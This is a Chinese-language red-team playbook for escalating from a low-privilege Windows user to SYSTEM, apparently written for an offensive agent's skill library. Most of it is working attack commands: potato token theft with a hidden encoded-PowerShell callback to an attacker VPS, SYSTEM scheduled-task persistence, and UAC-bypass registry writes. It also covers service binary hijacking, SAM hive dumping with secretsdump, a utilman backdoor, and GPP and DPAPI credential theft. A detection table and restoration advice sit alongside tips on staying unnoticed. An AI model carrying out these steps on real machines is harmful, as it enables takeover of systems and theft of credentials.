# Windows 提权全路径：从低权用户到 SYSTEM/域管的可验证阶梯

> 被 `privesc-persistence` 引用。核心判据只有一条：**`whoami` 回显变了才算提权成功**，
> 不是"命令跑了没报错"，也不是"工具说 vulnerable"。
>
> 为什么单独成文：技能正文的 Windows 提权只有 3 条命令 2 种手法，
> 而这里覆盖 5 大类 × 每类 2-4 条具体路径，每条都带「识别命令 → 利用 → **验伤** → 假成功反例」。
> 提权是本库最高频的动作，也是最容易自欺的地方——"我看到了 SeImpersonatePrivilege"
> 和"我拿到了 SYSTEM"中间隔着一次真实的令牌窃取。

## 〇、先做这一步：把体检一次跑全

不要边猜边试。先拿全量体检单，再按命中率排序打。**顺序错了会白忙**：
用户组/特权是「已具备能力」，配置错误是「可利用面」，补丁是「历史洞」——
永远先穷尽前两类（无风险、不留痕），内核/服务类 CVE 最后（可能蓝屏、必触发 EDR）。

```bat
:: 1) 身份与完整性级别（一个命令定方向）
whoami /all

:: 2) 特权清单只看这几条（有任意一条就有明确路径）
whoami /priv | findstr -i "SeImpersonate\|SeAssignPrimaryToken\|SeBackup\|SeRestore\|SeTakeOwnership\|SeDebug\|SeLoadDriver\|SeTcb"

:: 3) 用户组（进没进管理员组决定 UAC 有没有意义）
whoami /groups | findstr -i "Administrators\|Mandatory\|High\|Medium\|System"

:: 4) 网络与路径（服务类路径滥用全靠这个）
net session >nul 2>&1 && echo ADMIN_SHELL
sc qc <服务名>          :: 看 BINARY_PATH_NAME
```

**三条判据先明确，后面每条路径都靠它们验伤**：

| 判据 | 含义 | 反例（看起来成功其实是假） |
| --- | --- | --- |
| `whoami` = `nt authority\system` | 真的到 SYSTEM | 只是拿到了 `SeDebugPrivilege`（还需注入）；或进程被降权 |
| `whoami /groups` 里 `High Mandatory Level` + 管理员组 | UAC 后的"半个管理员" | 中完整性（Medium）= 没绕过 UAC，管理组权限全被过滤 |
| 能读 `C:\Windows\System32\config\SAM` | 到手的是真 SYSTEM | `SeBackupPrivilege` 也能读，但那不是 SYSTEM |

---

## 一、SeImpersonate / SeAssignPrimaryToken：烂土豆家族（命中率最高）

**为什么它排第一**：IIS AppPool、MSSQL、大部分 Windows 服务账号都带这个特权，
拿到任意服务账号（哪怕是 `NT AUTHORITY\NETWORK SERVICE`）就等于 SYSTEM。

### 识别

```bat
whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
:: 回显 "Enabled" 或 "Disabled" 都算 —— Disabled 也能通过 AdjustTokenPrivileges 打开
```

判断土豆家族选哪个（版本决定）：

```bat
ver
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

| 版本 | 首选 | 备选 | 备注 |
| --- | --- | --- | --- |
| Win10 1809+ / Server 2019+ | PrintSpoofer / GodPotato | JuicyPotatoNG | 老的 JuicyPotato 在 1809 后失效（CLSID 与 DCOM 都改了） |
| Win8 ~ Server 2016 | JuicyPotato | RoguePotato | 需要可用的 CLSID（`juicy-potato` 仓库按 OS 版本查） |
| 任意 + 已装 .NET 4 | SweetPotato | — | 一个二进制覆盖多种原语 |
| Server 2022 / Win11 | GodPotato / EfsPotato | — | PrintSpoofer 在较新版本被修 |

### 利用（以 PrintSpoofer 为例，最通用）

```bat
:: 前提：你有任意一个带 SeImpersonate 的进程身份 + 能把 exe 传到目标
:: 正向：直接弹 SYSTEM cmd（交互式会话才有意义）
PrintSpoofer.exe -i -c cmd

:: 反向：更适合远程/无交互（连回你的 VPS 监听）
PrintSpoofer.exe -c "C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -enc <base64>"

:: 兜底：不是交互会话时，写一个 SYSTEM 计划任务（可远程执行、不依赖窗口）
PrintSpoofer.exe -c "schtasks /create /tn UpdSvc /tr C:\temp\payload.exe /sc onstart /ru SYSTEM /f"
```

**验伤（必做，二选一）**：

```bat
:: A) 直接验身份
whoami                    :: nt authority\system

:: B) 验能力（更可靠：身份对但会话被限制时 whoami 会骗你）
type C:\Windows\System32\config\SAM >nul 2>&1 && echo SYSTEM_OK
reg save HKLM\SAM C:\temp\s.hiv     :: 成功 = 真 SYSTEM
```

**假成功反例（这三条是常见幻觉）**：
- `whoami` 回 SYSTEM 但 `whoami /priv` 里特权列表没变 → 只是改了身份名，实际令牌没换（少见但有过）。
- 反弹 shell 连上了，但那是 `NETWORK SERVICE` 的身份 → 土豆失败了，连的是原始进程。
- PrintSpoofer 报 `Could not create named pipe` → 目标上已有同名管道，或有 EDR 拦 pipe 创建。

### 失败分支

- **PrintSpoofer 失败** → 换 GodPotato（不同原语，Pipe 名字不同）。
- **全部 pipe 类失败** → 试 EfsPotato（走 EFS RPC）或 SweetPotato。
- **目标有 EDR 拦进程创建** → 别用 `.exe`，改用 **Potato + 内存加载**（`-c "powershell -enc"`），或走 `SeBackup` 路线（见第四节）。

---

## 二、UAC 绕过：只是"半个管理员"的临门一脚

**先判断值不值得做**：UAC 绕过只在「你在管理员组、但当前是中完整性」时有用。
不在管理员组 → 绕不过去（UAC 不是权限提升，是权限**过滤**的解除）。

### 识别

```bat
whoami /groups | findstr /i "Mandatory"
:: Medium Mandatory Level = 中完整性
net localgroup administrators | findstr /i "%USERNAME%"
:: 用户名在管理员组 → UAC 绕过有意义
```

### 手法（按可用性排序）

| 手法 | 条件 | 命令 | 是否留痕 |
| --- | --- | --- | --- |
| **fodhelper** | Win10 全版本，默认注册表可写 | `reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f` 然后写 `.../command` 默认值为 payload，运行 `fodhelper.exe` | 注册表改动 + 进程创建 |
| **computerdefaults** | 同上 | 把 `ms-settings` 换成 `ms-settings:computerdefaults` 相关键 | 同上 |
| **sdclt** | Win10 | 写 `HKCU\Software\Classes\Folder\shell\open\command`，运行 `sdclt.exe /kickoffelev` | 同上 |
| **ICMLuaUtil**（COM） | Win10/11，无文件 | 通过 `CMSTPLUA` COM 接口 `ShellExec` 启动进程（需要脚本宿主或 C# 反射） | 几乎只留进程创建 |
| **AlwaysInstallElevated** | 两条注册表都为 1 | 见下 | MSI 安装事件 |

**AlwaysInstallElevated 单独说**——它最容易误判：

```bat
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 两条都必须 = 0x1。只查 HKCU 会误判（HKLM 没开则整条路不通）
```

```bat
:: 两条都开了才能这样打（生成恶意 MSI 后在目标上安装）
msiexec /quiet /qn /i C:\temp\evil.msi
```

### 验伤

```bat
whoami /groups | findstr /i "High Mandatory Level"
:: 出现 High 才算绕过成功；仍是 Medium = 失败
```

**假成功反例**：
- `fodhelper.exe` 启动了一个进程，但那个进程仍是 Medium → 注册表键写错了位置
  （`DelegateExecute` 必须为空字符串，漏了它就走默认行为）。
- 目标装了 UAC 通知设置为「始终通知」→ fodhelper 会弹框，远程无人确认。此时改用 COM 手法（无 UI）。

---

## 三、服务类路径滥用（配置错误，不留 CVE 痕迹）

三类，按命中率排：**可写服务二进制 → 未加引号路径 → 可写服务注册表键**。

### 3a. 服务二进制文件路径可写

```bat
:: 找路径可写的服务（accesschk 是 Sysinternals，也可用 icacls 手工判）
accesschk.exe /accepteula -uwcqv "Authenticated Users" * /accepteula
:: 或逐个看（没 accesschk 时）
for /f "tokens=2 delims=:" %a in ('sc query type= service state= all ^| findstr SERVICE_NAME') do @icacls "%~a" 2>nul | findstr /i "Everyone\|Users\|Authenticated"
```

命中后：

```bat
:: 备份原 exe → 替换成 payload → 重启服务 → 恢复原 exe（干净退场）
copy "C:\Program Files\Vuln\svc.exe" C:\temp\svc.exe.bak
copy /y C:\temp\payload.exe "C:\Program Files\Vuln\svc.exe"
sc stop VulnSvc & sc start VulnSvc
:: 完事后还原（不然报告里这条动作无法回滚）
copy /y C:\temp\svc.exe.bak "C:\Program Files\Vuln\svc.exe"
```

### 3b. 未加引号的服务路径（Unquoted Service Path）

```bat
:: 列出所有未加引号且含空格的路径
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

原理：`C:\Program Files\Vuln App\svc.exe` 未加引号时，Windows 按顺序尝试
`C:\Program.exe` → `C:\Program Files\Vuln.exe` → `C:\Program Files\Vuln App\svc.exe`。
在**你有写权限的目录**里放一个同名 exe 即可劫持。

```bat
:: 判可写：只有目录可写才成立（不可写就白搭）
icacls "C:\Program Files\Vuln App"
:: 可写就往里放 C:\Program Files\Vuln.exe（注意：这是目录里第一个尝试名）
```

**假成功反例**：`wmic` 列出未加引号 ≠ 可利用。必须逐条 `icacls` 确认
**中间那个路径的父目录**你可写。90% 的实例是 `C:\Program Files\` 本身不可写 → 不可利用。

### 3c. 服务注册表键可写（改 ImagePath 或加服务）

```bat
:: 判注册表键 ACL（需要 subinacl 或 PowerShell）
powershell -c "Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc | Format-List"
:: 有 Everyone/Users 的 SetValue → 可直接改 ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\payload.exe" /f
sc stop VulnSvc & sc start VulnSvc
```

**验伤（三类通用）**：

```bat
sc qc VulnSvc | findstr BINARY_PATH_NAME   :: 确认改到了
whoami                                      :: 服务是以 SYSTEM 跑的 → 应为 nt authority\system
:: 反向验证：payload 里写一个 `whoami > C:\temp\who.txt`，读到 system 才算
```

---

## 四、特权滥用：SeBackup / SeRestore / SeTakeOwnership / SeDebug

这四条不走"配置错误"，而是**Windows 主动授予的合法能力被滥用**。
好处：几乎不触发告警（它们本来就是备份/调试用途）。

| 特权 | 能做什么 | 典型路径 | 验伤 |
| --- | --- | --- | --- |
| `SeBackupPrivilege` | 绕过 ACL 读任意文件（含 SAM/NTDS） | `reg save` 或 `robocopy /b` 拿 SAM+SYSTEM → 离线提哈希 | 拿到 hive 且 `secretsdump` 能解出 hash |
| `SeRestorePrivilege` | 绕过 ACL 写任意文件 | 覆盖 `utilman.exe` / `sethc.exe` 为 cmd → 锁屏下按 Shift×5 出 SYSTEM shell | 真触发过一次才算（别只看文件已覆盖） |
| `SeTakeOwnershipPrivilege` | 夺取任意对象所有权 | 夺 `C:\Windows\System32\` 下文件所有权 → 改 ACL → 改写 | `icacls` 显示你已是 owner |
| `SeDebugPrivilege` | 打开任意进程（含 SYSTEM 进程） | 注入到 SYSTEM 进程（`winlogon.exe`）→ 借它的令牌 | 注入后 `whoami` 为 SYSTEM |
| `SeLoadDriverPrivilege` | 加载内核驱动 | 加载有漏洞的签名驱动 → 内核任意读写 | 驱动服务状态 RUNNING + 能读写内核内存 |
| `SeTcbPrivilege` | 相当于 SYSTEM（"act as OS"） | 直接 `CreateProcessAsUser` 用 SYSTEM 令牌 | `whoami` 为 SYSTEM |

### SeBackupPrivilege 完整链路（最干净的一条）

```bat
:: 1) 拿 hive（需要在有特权的进程里，reg save 默认不吃 SeBackup，多数场景直接可用）
reg save HKLM\SAM C:\temp\SAM.hiv
reg save HKLM\SYSTEM C:\temp\SYSTEM.hiv
reg save HKLM\SECURITY C:\temp\SECURITY.hiv

:: 2) 若无权限，用 robocopy 备份模式（/b 使用 SeBackupPrivilege）
robocopy C:\Windows\System32\config C:\temp\config /b SAM SYSTEM SECURITY

:: 3) 传到本地离线解（不要在目标上跑 hashcat）
secretsdump.py -sam SAM.hiv -system SYSTEM.hiv -security SECURITY.hiv LOCAL
```

**假成功反例**：`reg save` 报 `ERROR: Access is denied` 但你以为是路径问题 →
实际是当前进程没启用 SeBackup（多数情况它默认 Disabled，需
`whoami /priv` 看到 `SeBackupPrivilege` 存在，再用工具启用；不存在则此路不通）。

### SeRestorePrivilege 的坑（最容易误判）

覆盖 `utilman.exe` **不会立即给你 SYSTEM**。要真正提权必须：
1. 备份原文件；
2. 覆盖为 `cmd.exe`；
3. **触发**：锁屏（`rundll32 user32.dll,LockWorkStation`）→ 按 Shift×5 → 出 cmd；
4. 这个 cmd 是 SYSTEM；
5. **恢复原文件**（不恢复就是留下明显的后门痕迹）。

只做 1-2 就宣布"提权成功"是错的——文件改了不等于拿到权限。

---

## 五、其他高频面（补充，命中率较低但要过一遍）

### 5a. 自动登录凭据（明文密码就在注册表）

```bat
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: 有值 = 明文密码。注意：这条不是提权，是"拿到更高权限账号的密码"
```

### 5b. 计划任务 / 脚本可写

```bat
schtasks /query /fo LIST /v | findstr /i "TaskName\|Run As User\|Task To Run"
:: 找到以 SYSTEM/管理员 跑、且脚本文件你可写的任务 → 改脚本内容，等它跑
```

**判据**：任务运行用户必须**高于你**，且脚本路径你可写。两个条件缺一不可。

### 5c. 组策略首选项（GPP）里的 cpassword

```bat
:: 域内机器上（SYSVOL 可读）
findstr /S /I cpassword \\corp.local\SYSVOL\*.xml
:: 拿到后用 gpp-decrypt 解（AES key 是微软公开的固定值）
```

### 5d. 已保存的 RDP / 凭据

```bat
cmdkey /list                                   :: 当前用户的凭据
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\    :: DPAPI 凭据文件
:: 配合 mimikatz dpapi::cred 解（需要当前用户上下文或 masterkey）
```

### 5e. 内核/驱动 CVE（最后手段）

只在前面全失败时考虑。理由：成功率低（版本要精确匹配）、必触发 EDR、
有蓝屏风险（生产机上打崩就是事故）。

```bat
:: 先精确判补丁级别（别只看版本号）
systeminfo | findstr /C:"OS Version" /C:"Hotfix(s)"
wmic qfe list brief /format:table
:: 再看候选（按 KB 缺口对 CVE）
```

**纪律**：内核 exp 必须先在**同版本的测试机**上验证，绝不直接在生产机试。
报告里要写明"未验证的内核利用属于高风险动作，已跳过"。

---

## 六、提权之后立刻要做的三件事

不是"提权成功就完事"：

1. **验伤留证**（前面每条路径的验伤命令输出都要存到 `runs/`）——
   报告里的每一条"提权成功"都要能被这份输出复现。
2. **落库**：`redteam_access_add` 更新权限档（`privilege=system|admin`），
   `redteam_score_hit` 记分（`server-host` 按档位）。
3. **别急着打下一台**：本机凭据还没榨干（转 `credential-attack`），
   持久化还没做（回技能正文第二问）。

---

## 七、检测视角：每条路径防守方看哪里

| 路径 | 日志源 | 典型信号 | 噪声级别 |
| --- | --- | --- | --- |
| 土豆家族 | Sysmon 17/18（管道）+ 4688 | 匿名管道创建 + 由非 SYSTEM 进程发起 | 中（部分正常软件也用管道） |
| UAC 绕过 | 4688 + 注册表审计 | `fodhelper.exe`/`sdclt.exe` 的父进程是 Office/浏览器 | 低（很干净） |
| 服务路径替换 | 7045（服务安装）+ 4688 | 服务 exe 被替换、ImagePath 变更 | 中 |
| SeBackup 提哈希 | 4663（对象访问）+ 4656 | `reg save` / `robocopy /b` 访问 config hive | **低**（最隐蔽） |
| SeRestore 覆盖 utilman | 4663 + 文件完整性 | `utilman.exe` 被修改（正常运维不会动它） | 低 |
| SeDebug 注入 | Sysmon 10 + 4688 | 低权进程 `OpenProcess` 到 `winlogon.exe` | 低 |
| 内核 CVE | EDR 行为链 + 崩溃 | 异常内存映射、`commit_creds` 类似序列、进程 uid 无 sudo 记录变更 | 高（几乎必被抓） |

**实用推论**：如果这是演练且目标是"不被发现"，优先 **SeBackup → GPP → 服务配置** 这条线
（噪声最低）；土豆家族快但管道特征明显；内核 CVE 留到最后且要接受被抓。

---

## 八、常见坑清单

1. **`whoami /priv` 显示 Disabled ≠ 不可用**。多数特权对已授权的 token 是 Disabled 状态，
   进程可以自己 `AdjustTokenPrivileges` 打开。只有**不存在**这条特权才是真不可用。
2. **`whoami` 在受限会话里会说谎**。IIS 的 `whoami` 有时回 SYSTEM 但实际是 AppPool 身份混杂。
   用"能不能读 SAM"验，别只信 whoami。
3. **服务重启不一定真的重启**。`sc stop` 报 `STOP_PENDING` 时进程可能还活着；
   等 `sc query` 显示 `STOPPED` 再 start，否则替换的 exe 没被加载。
4. **改完必须还原**。服务 exe、utilman、注册表键都要能回滚，报告里要能说出原值。
   不还原 = 留了一个永久后门 = 事故。
5. **`accesschk` 需要 `/accepteula`**，漏了会静默不输出（看起来像"没有可写服务"）。
6. **AlwaysInstallElevated 必须查两条**（HKLM 与 HKCU），只查一条会误判。
7. **UAC 绕过在「始终通知」+ 无人值守时全废**，改用 COM（ICMLuaUtil）无 UI 手法。
8. **别在生产机上编译内核 exp**。编译产物 + 崩溃风险，两个都是事故级。